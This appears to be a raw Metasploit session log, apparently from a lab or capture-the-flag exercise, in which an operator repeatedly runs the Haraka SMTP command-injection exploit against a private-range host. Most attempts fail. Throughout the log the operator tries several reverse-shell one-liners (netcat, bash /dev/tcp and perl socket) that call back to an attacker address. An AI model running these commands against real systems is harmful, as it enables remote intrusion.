@@ -1,0 +1,944 @@
+ali:~$ msfdb run
+[-] Error: /usr/bin/msfdb must be run as root
+kali@kali:~$ sudo msfdb run
+[sudo] password for kali: 
+[+] Starting database
+                                                  
+                                   ___          ____
+                               ,-""   `.      < HONK >
+                             ,'  _   e )`-._ /  ----
+                            /  ,' `-._<.===-'
+                           /  /
+                          /  ;
+              _          /   ;
+ (`._    _.-"" ""--..__,'    |
+ <_  `-""                     \
+  <`-                          :
+   (__   <__.                  ;
+     `-.   '-.__.      _.'    /
+        \      `-.__,-'    _,'
+         `._    ,    /__,-'
+            ""._\__,'< <____
+                 | |  `----.`.
+                 | |        \ `.
+                 ; |___      \-``
+                 \   --<
+                  `.`.<
+                    `-'
+
+
+
+       =[ metasploit v5.0.71-dev                          ]
++ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+msf5 > search haraka
+
+Matching Modules
+================
+
+   #  Name                       Disclosure Date  Rank       Check  Description
+   -  ----                       ---------------  ----       -----  -----------
+   0  exploit/linux/smtp/haraka  2017-01-26       excellent  Yes    Haraka SMTP Command Injection
+
+
+msf5 > use exploit/linux/smtp/haraka 
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8080             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  foo@example.com  yes       Address to send from
+   email_to    admin@localhost  yes       Email to send to, must be accepted by the server
+   rhost                        yes       Target server
+   rport       25               yes       Target server port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > set SRVHOST 192.168.19.40
+SRVHOST => 192.168.19.40
+msf5 exploit(linux/smtp/haraka) > set email_from fadz@gmail.com
+email_from => fadz@gmail.com
+msf5 exploit(linux/smtp/haraka) > set email_to admin@gmail.com
+email_to => admin@gmail.com
+msf5 exploit(linux/smtp/haraka) > set rhost 192.168.40.81
+rhost => 192.168.40.81
+msf5 exploit(linux/smtp/haraka) > set rport 5555
+rport => 5555
+msf5 exploit(linux/smtp/haraka) > set LHOST tun0
+LHOST => tun0
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8080             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       5555             yes       Target server port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > run
+
+[-] Exploit failed: invalid address
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > show advance options
+[-] Invalid parameter "advance", use "show -h" for more information
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8080             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       5555             yes       Target server port
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.19.40    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/shell_reverse_tcp
+payload => linux/x64/shell_reverse_tcp
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8080             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       5555             yes       Target server port
+
+
+Payload options (linux/x64/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.19.40    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Started reverse TCP handler on 192.168.19.40:4444 
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8080/aNuQF1Z4fZZ2HY
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set LPORT 4445
+LPORT => 4445
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8080             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       5555             yes       Target server port
+
+
+Payload options (linux/x64/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.19.40    yes       The listen address (an interface may be specified)
+   LPORT  4445             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Started reverse TCP handler on 192.168.19.40:4445 
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8080/99uSyHKpbOqYxg
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set SRVPORT 8585
+SRVPORT => 8585
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Started reverse TCP handler on 192.168.19.40:4445 
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8585/7NzIhlbI
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/
+set payload linux/x64/exec                        set payload linux/x64/meterpreter_reverse_tcp     set payload linux/x64/shell_bind_ipv6_tcp
+set payload linux/x64/meterpreter/bind_tcp        set payload linux/x64/pingback_bind_tcp           set payload linux/x64/shell_bind_tcp
+set payload linux/x64/meterpreter/reverse_tcp     set payload linux/x64/pingback_reverse_tcp        set payload linux/x64/shell_bind_tcp_random_port
+set payload linux/x64/meterpreter_reverse_http    set payload linux/x64/shell/bind_tcp              set payload linux/x64/shell_reverse_ipv6_tcp
+set payload linux/x64/meterpreter_reverse_https   set payload linux/x64/shell/reverse_tcp           set payload linux/x64/shell_reverse_tcp
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/
+set payload linux/x64/exec                        set payload linux/x64/meterpreter_reverse_tcp     set payload linux/x64/shell_bind_ipv6_tcp
+set payload linux/x64/meterpreter/bind_tcp        set payload linux/x64/pingback_bind_tcp           set payload linux/x64/shell_bind_tcp
+set payload linux/x64/meterpreter/reverse_tcp     set payload linux/x64/pingback_reverse_tcp        set payload linux/x64/shell_bind_tcp_random_port
+set payload linux/x64/meterpreter_reverse_http    set payload linux/x64/shell/bind_tcp              set payload linux/x64/shell_reverse_ipv6_tcp
+set payload linux/x64/meterpreter_reverse_https   set payload linux/x64/shell/reverse_tcp           set payload linux/x64/shell_reverse_tcp
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/shell_
+set payload linux/x64/shell_bind_ipv6_tcp         set payload linux/x64/shell_bind_tcp_random_port  set payload linux/x64/shell_reverse_tcp
+set payload linux/x64/shell_bind_tcp              set payload linux/x64/shell_reverse_ipv6_tcp      
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/shell_
+set payload linux/x64/shell_bind_ipv6_tcp         set payload linux/x64/shell_bind_tcp_random_port  set payload linux/x64/shell_reverse_tcp
+set payload linux/x64/shell_bind_tcp              set payload linux/x64/shell_reverse_ipv6_tcp      
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/shell_bind_tcp
+payload => linux/x64/shell_bind_tcp
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8585             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       5555             yes       Target server port
+
+
+Payload options (linux/x64/shell_bind_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LPORT  4445             yes       The listen port
+   RHOST  192.168.40.81    no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > set RHOST ''
+RHOST => 
+msf5 exploit(linux/smtp/haraka) > run
+
+[-] Exploit failed: The following options failed to validate: rhost.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set rhost
+rhost => 
+msf5 exploit(linux/smtp/haraka) > set rhost null
+[-] The following options failed to validate: Value 'null' is not valid for option 'rhost'.
+rhost => 
+msf5 exploit(linux/smtp/haraka) > set rhost 192.168.40.81
+rhost => 192.168.40.81
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8585/ljVHM3zOmp8Im0b
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/
+set payload linux/x64/exec                        set payload linux/x64/meterpreter_reverse_tcp     set payload linux/x64/shell_bind_ipv6_tcp
+set payload linux/x64/meterpreter/bind_tcp        set payload linux/x64/pingback_bind_tcp           set payload linux/x64/shell_bind_tcp
+set payload linux/x64/meterpreter/reverse_tcp     set payload linux/x64/pingback_reverse_tcp        set payload linux/x64/shell_bind_tcp_random_port
+set payload linux/x64/meterpreter_reverse_http    set payload linux/x64/shell/bind_tcp              set payload linux/x64/shell_reverse_ipv6_tcp
+set payload linux/x64/meterpreter_reverse_https   set payload linux/x64/shell/reverse_tcp           set payload linux/x64/shell_reverse_tcp
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/meterpreter/reverse_tcp 
+payload => linux/x64/meterpreter/reverse_tcp
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8585             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       5555             yes       Target server port
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.19.40    yes       The listen address (an interface may be specified)
+   LPORT  4445             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > set LPORT 80
+LPORT => 80
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Started reverse TCP handler on 192.168.19.40:80 
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8585/M25GFG4frL6
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set srvport 8001
+srvport => 8001
+msf5 exploit(linux/smtp/haraka) > set srvhost 0.0.0.0
+srvhost => 0.0.0.0
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Started reverse TCP handler on 192.168.19.40:80 
+[*] Exploiting...
+[*] Using URL: http://0.0.0.0:8001/jg69Toj2W2
+[*] Local IP: http://192.168.1.60:8001/jg69Toj2W2
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set srvhost 192.168.19.40
+srvhost => 192.168.19.40
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Started reverse TCP handler on 192.168.19.40:80 
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/iZugoKqtD
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8001             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       5555             yes       Target server port
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.19.40    yes       The listen address (an interface may be specified)
+   LPORT  80               yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > set rport 25
+rport => 25
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Started reverse TCP handler on 192.168.19.40:80 
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/GFOcmVEhxbmN
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/
+set payload linux/x64/exec                        set payload linux/x64/meterpreter_reverse_tcp     set payload linux/x64/shell_bind_ipv6_tcp
+set payload linux/x64/meterpreter/bind_tcp        set payload linux/x64/pingback_bind_tcp           set payload linux/x64/shell_bind_tcp
+set payload linux/x64/meterpreter/reverse_tcp     set payload linux/x64/pingback_reverse_tcp        set payload linux/x64/shell_bind_tcp_random_port
+set payload linux/x64/meterpreter_reverse_http    set payload linux/x64/shell/bind_tcp              set payload linux/x64/shell_reverse_ipv6_tcp
+set payload linux/x64/meterpreter_reverse_https   set payload linux/x64/shell/reverse_tcp           set payload linux/x64/shell_reverse_tcp
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/shell_reverse_tcp
+payload => linux/x64/shell_reverse_tcp
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Started reverse TCP handler on 192.168.19.40:80 
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/PqWwUn
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8001             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       25               yes       Target server port
+
+
+Payload options (linux/x64/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.19.40    yes       The listen address (an interface may be specified)
+   LPORT  80               yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/
+set payload linux/x64/exec                        set payload linux/x64/meterpreter_reverse_tcp     set payload linux/x64/shell_bind_ipv6_tcp
+set payload linux/x64/meterpreter/bind_tcp        set payload linux/x64/pingback_bind_tcp           set payload linux/x64/shell_bind_tcp
+set payload linux/x64/meterpreter/reverse_tcp     set payload linux/x64/pingback_reverse_tcp        set payload linux/x64/shell_bind_tcp_random_port
+set payload linux/x64/meterpreter_reverse_http    set payload linux/x64/shell/bind_tcp              set payload linux/x64/shell_reverse_ipv6_tcp
+set payload linux/x64/meterpreter_reverse_https   set payload linux/x64/shell/reverse_tcp           set payload linux/x64/shell_reverse_tcp
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/shell/reverse_tcp 
+payload => linux/x64/shell/reverse_tcp
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Started reverse TCP handler on 192.168.19.40:80 
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/zS0P6lO4
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set payload linux/x64/exec
+payload => linux/x64/exec
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8001             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       25               yes       Target server port
+
+
+Payload options (linux/x64/exec):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+   CMD                    yes       The command string to execute
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > set CMD nc -e /bin/bash 192.168.19.40 4445
+CMD => nc -e /bin/bash 192.168.19.40 4445
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8001             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       25               yes       Target server port
+
+
+Payload options (linux/x64/exec):
+
+   Name  Current Setting                     Required  Description
+   ----  ---------------                     --------  -----------
+   CMD   nc -e /bin/bash 192.168.19.40 4445  yes       The command string to execute
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/iLfrdJTU
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/nxkRufncCF
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8001             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       25               yes       Target server port
+
+
+Payload options (linux/x64/exec):
+
+   Name  Current Setting                     Required  Description
+   ----  ---------------                     --------  -----------
+   CMD   nc -e /bin/bash 192.168.19.40 4445  yes       The command string to execute
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > set CMD nc -e /bin/sh 192.168.19.40 4445
+CMD => nc -e /bin/sh 192.168.19.40 4445
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/PiAvi4WIz4VB62
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set CMD nc -e /bin/sh 192.168.19.40 443
+CMD => nc -e /bin/sh 192.168.19.40 443
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/st8b6meE
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/AOhcv5zWb
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/4NVAtbLA
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set CMD nc -e /bin/bash 192.168.19.40 443
+CMD => nc -e /bin/bash 192.168.19.40 443
+msf5 exploit(linux/smtp/haraka) > set CMD 'bash -i >& /dev/tcp/192.168.19.40/4242 0>&1'
+CMD => bash -i >& /dev/tcp/192.168.19.40/4242 0>&1
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8001             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       25               yes       Target server port
+
+
+Payload options (linux/x64/exec):
+
+   Name  Current Setting                              Required  Description
+   ----  ---------------                              --------  -----------
+   CMD   bash -i >& /dev/tcp/192.168.19.40/4242 0>&1  yes       The command string to execute
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/yFpA8DAaqdYc
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set CMD 0<&196;exec 196<>/dev/tcp/192.168.19.40/4242 sh <&196 >&196 2>&196
+CMD => 0<&196;exec 196<>/dev/tcp/192.168.19.40/4242 sh <&196 >&196 2>&196
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/GbDhLubI5fxPK
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set CMD perl -e 'use Socket;$i="192.168.19.40";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+CMD => perl -e use Socket;$i="192.168.19.40";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/Tz8mghUciE2in6J
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > show options
+
+Module options (exploit/linux/smtp/haraka):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     192.168.19.40    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8001             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+   email_from  fadz@gmail.com   yes       Address to send from
+   email_to    admin@gmail.com  yes       Email to send to, must be accepted by the server
+   rhost       192.168.40.81    yes       Target server
+   rport       25               yes       Target server port
+
+
+Payload options (linux/x64/exec):
+
+   Name  Current Setting                                                                                                                                                                                                               Required  Description
+   ----  ---------------                                                                                                                                                                                                               --------  -----------
+   CMD   perl -e use Socket;$i="192.168.19.40";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};  yes       The command string to execute
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   linux x64
+
+
+msf5 exploit(linux/smtp/haraka) > set email_to harakiri@harakiri
+email_to => harakiri@harakiri
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/0wxCzpMHyu0W
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set email_to harakiri@harakiri.com
+email_to => harakiri@harakiri.com
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/Vf1JP4
+[*] Sending mail to target server...
+[-] Exploit aborted due to failure: unknown: Module exited abnormally
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > set email_to root@harakiri
+email_to => root@harakiri
+msf5 exploit(linux/smtp/haraka) > run
+
+[*] Exploiting...
+[*] Using URL: http://192.168.19.40:8001/SXdrpGK6NlE9D
+[*] Sending mail to target server...
+[-] Bug not triggered in target server
+[-] it may not be vulnerable or have the attachment plugin activated
+[*] Command Stager progress - 100.00% done (119/119 bytes)
+[*] Server stopped.
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/smtp/haraka) > run
+
